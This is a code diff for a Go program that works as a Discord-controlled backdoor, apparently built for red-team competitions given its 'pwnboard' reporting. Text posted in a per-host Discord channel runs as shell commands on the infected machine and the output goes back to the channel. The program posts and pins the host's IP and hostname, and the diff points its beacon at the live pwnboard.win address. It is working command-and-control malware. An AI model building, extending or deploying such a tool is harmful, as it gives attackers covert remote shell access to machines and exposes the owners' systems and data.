@@ -18,7 +18,10 @@ import (
 )
 
 var categoryid disgord.Snowflake
+var channelid disgord.Snowflake
 var con = context.Background()
+var glocli *disgord.Client
+var channel *disgord.Channel = nil
 var debug = true
 
 //Config is used to represent the config file
@@ -47,21 +50,29 @@ func processError(err error){
 func userInput(s disgord.Session, evt *disgord.MessageCreate){
 	msg := evt.Message
 
+	// If the channel ID is not the same as the message's Channel ID
+	// Ignore it
+	if (channelid != msg.ChannelID){
+		return
+	}
 	if !evt.Message.Author.Bot{
+		// Problem is it is sending/receive the command globally <-------------Think of a way
 		if msg.Content == "ping" {
-			s.SendMsg(con, msg.ChannelID, "I am alive. Thanks")	
+			msg.Reply(evt.Ctx, s, "I am alive. Thank you")
 		}else if msg.Content == "die"{ //TODO: Still stop all program, we don't want that
 			// Delete Channel
 			s.DeleteChannel(con, msg.ChannelID)
+			os.Exit(0)
 		}else if msg.Content == "install" {
-			//Install stuff based on OS
+			//Install stuff based on OS <-------------TODO
 		}else{
+			// fmt.Println("INPUT COMMAND")
 			//run os command and send results
 			output := shellRun(msg.Content)
 			if output == ""{
-				msg.Reply(con, s, "Command didn't return anything")
+				s.SendMsg(con, channelid, "Command didn't return anything")
 			}else{
-				msg.Reply(con, s, prettyOutput(output))
+				s.SendMsg(con, channelid, prettyOutput(output))
 			}
 		}
 	}else{
@@ -109,8 +120,8 @@ func updatepwnBoard(ip string){
 
 		time.Sleep(7 * time.Second)
 
-		// url := "http://pwnboard.win/generic"
-		url := "http://localhost:8080"
+		url := "http://pwnboard.win/generic"
+		// url := "http://localhost:8080"
 
      	// Create the struct
      	data := PwnBoard{
@@ -183,8 +194,9 @@ func main(){
 
 	client := disgord.New(disgord.Config{
 		BotToken: config.Discord.Token,
-		Logger: disgord.DefaultLogger(false),
 	})
+
+	glocli = client
 
 	id := config.Discord.ID
 	categoryName := config.Channel.OS
@@ -205,20 +217,20 @@ func main(){
 	categoryid = category.ID
 
 	//general channel
-	// creator.CreateChannel(client, id,  category, "general")
+	// creator.CreateChannel(client, id,  category, "general")<--------------------TODO
 
 	//create channel
-	subchan := creator.CreateChannel(channels, client, id,  category, channelName)
-
+	channel = creator.CreateChannel(channels, client, id,  category, channelName)
+	channelid = channel.ID
 
 	// sending system ingo
 	hostname , _ := os.Hostname()
 	systeminfo := ""
 	systeminfo += "IP: " + getIP() + "\n"
 	systeminfo += "Hostname: " + hostname + "\n"
-	systeminfo += "OS: UNKNOW\n"
+	systeminfo += "OS: " + categoryName + "\n"
 
-	systeminfomsg, _ := client.SendMsg(con, subchan.ID, prettyOutput(systeminfo))
+	systeminfomsg, _ := client.SendMsg(con, channel.ID, prettyOutput(systeminfo))
 	client.PinMessage(con, systeminfomsg)
 
 	client.On(disgord.EvtMessageCreate, userInput)
